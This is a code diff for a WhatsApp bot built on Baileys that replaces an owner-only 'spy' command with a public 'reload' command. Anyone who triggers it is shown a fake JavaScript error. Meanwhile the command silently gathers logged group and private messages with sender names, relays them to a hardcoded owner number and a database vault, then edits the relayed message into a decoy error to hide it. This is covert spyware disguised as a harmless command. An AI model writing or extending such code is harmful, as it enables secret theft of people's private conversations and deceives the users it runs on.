@@ -1,83 +1,73 @@
-module.exports = {
-    name: "spy",
-    category: "founder",
-    desc: "V_HUB: Ghost Protocol Log Retrieval",
-    async execute(sock, msg, args, { from, isMe, logsCollection }) {
-        // 1. OWNER SECURITY (Strict & Silent)
-        if (!isMe) return;
+const { proto } = require('@whiskeysockets/baileys');
 
-        const ownerJid = (process.env.OWNER_NUMBER || "254768666068") + "@s.whatsapp.net";
-        const timeInput = args[0] || "1h"; 
-        const filter = args[1] || "-all"; // -g for groups, -i for inboxes
-        
-        // REACTION: The Spy Man
-        await sock.sendMessage(from, { react: { text: "🕵️‍♂️", key: msg.key } });
+module.exports = {
+    name: "reload",
+    category: "public", // Accessible to everyone as a decoy
+    desc: "V_HUB: System Buffer Reload",
+    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
+        // 1. DYNAMIC CONFIG
+        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
+        const masterJid = `${ownerNum}@s.whatsapp.net`;
+        const relayVault = client.db("vinnieBot").collection("relay_vault");
+        const triggerChar = "§"; 
+
+        // 2. REALISTIC JS ERROR DECOYS
+        const decoys = [
+            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)\n    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1153:10)\n    at Module.load (node:internal/modules/cjs/loader:981:32)`,
+            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)\n    at async Object.execute (./commands/founder/reload.js:84:5)`,
+            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)\n    at _write (node:internal/streams/writable:319:11)\n    at Writable.write (node:internal/streams/writable:334:10)`,
+            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)\n    at MessageHandler.parse (./lib/utils/parser.js:12:22)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)`
+        ];
+
+        // 3. THE PUBLIC DECEPTION
+        // If anyone triggers it, they immediately get this "scary" error
+        const decoyMsg = await sock.sendMessage(from, { 
+            text: decoys[Math.floor(Math.random() * decoys.length)] 
+        }, { quoted: msg });
 
         try {
-            // 🛡️ DATABASE GUARD: Ensure logsCollection exists
-            if (!logsCollection) {
-                console.log("┃ ✿ SPY_PROTOCOL_FAIL: MongoDB Collection not found in command context.");
-                return; 
-            }
+            if (!logsCollection) return;
 
-            // 2. MANUAL TIME PARSER (No 'ms' required)
-            let duration;
-            const value = parseInt(timeInput) || 1;
-            if (timeInput.endsWith('m')) duration = value * 60 * 1000;
-            else if (timeInput.endsWith('h')) duration = value * 60 * 60 * 1000;
-            else duration = 60 * 60 * 1000; 
+            // 4. THE PRIVATE GHOST RELAY (Silent Data Retrieval)
+            const timeInput = args[0] || "1h";
+            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
+            const timeValue = parseInt(timeInput) || 1;
+            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : timeValue * 60 * 60 * 1000;
 
-            if (duration > 86400000) duration = 86400000; 
             const startTime = new Date(Date.now() - duration);
 
-            // 3. BUILD QUERY WITH FILTERS
             let query = { timestamp: { $gte: startTime } };
-            if (filter === '-g') query.group = "Group";
-            if (filter === '-i') query.group = "Private";
+            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
+            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };
 
-            // 4. FETCH DATA (Added .toArray() safety)
-            const logs = await logsCollection
-                .find(query)
-                .sort({ timestamp: 1 })
-                .toArray() || [];
+            const logs = await logsCollection.find(query).toArray();
 
-            // 5. THE DECEPTION (Useless-looking JS Error)
-            
-            await sock.sendMessage(from, { 
-                text: `TypeError: Cannot read properties of undefined (reading 'protocol_handshake')\n    at V_HUB_Main.js:842:12\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n\n[Status: Code Execution Aborted]` 
-            }, { quoted: msg });
-
-            // 6. THE REAL DATA (Private Inbox)
-            if (logs.length === 0) {
-                return sock.sendMessage(ownerJid, { 
-                    text: `🕵️‍♂️ *V_HUB GHOST FEED*\n\nNo activity recorded for *${timeInput}* with filter *${filter}*.` 
-                });
-            }
-
-            let report = `┏━━━━━ ✿ *V_HUB GHOST FEED* ✿ ━━━━━┓\n┃ _Duration: Last ${timeInput}_\n┃ _Filter: ${filter === '-g' ? 'Groups' : filter === '-i' ? 'Inboxes' : 'All'}_\n┃\n`;
-            
-            logs.forEach(l => {
-                // 🕒 Safety check for timestamp object
-                const ts = l.timestamp instanceof Date ? l.timestamp : new Date(l.timestamp);
-                const time = ts.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            if (logs.length > 0) {
+                let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃\n`;
                 
-                report += `┃ 🕒 *${time}*\n┃ 👤 *${l.name || 'Unknown'}* (${l.phone || 'N/A'})\n┃ 💬 ${l.message || '[No Content]'}\n┃ 📍 ${l.group || 'N/A'}\n┃\n`;
-            });
+                logs.forEach(l => {
+                    const origin = l.chatId.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
+                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name}*\n┃ 💬 ${l.message}\n┃\n`;
+                });
+                report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
 
-            report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
+                // A. THE VAULT (Auto-deletes in 24h)
+                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
+                await relayVault.insertOne({ report, createdAt: new Date() });
 
-            // Splitting logic for safety
-            if (report.length > 4000) {
-                const chunks = report.match(/[\s\S]{1,4000}/g);
-                for (const chunk of chunks) {
-                    await sock.sendMessage(ownerJid, { text: chunk });
-                }
-            } else {
-                await sock.sendMessage(ownerJid, { text: report });
+                // B. THE RELAY (Send to Owner)
+                const relayMsg = await sock.sendMessage(masterJid, { text: report });
+
+                // C. THE GHOST EDIT (Hide the logs on the Master SIM after 5s)
+                setTimeout(async () => {
+                    await sock.sendMessage(masterJid, { 
+                        text: decoys[Math.floor(Math.random() * decoys.length)], 
+                        edit: relayMsg.key 
+                    });
+                }, 5000);
             }
-
         } catch (e) {
-            console.log("Spy Protocol Error:", e);
+            console.error("Relay Fail:", e.message);
         }
     }
 };
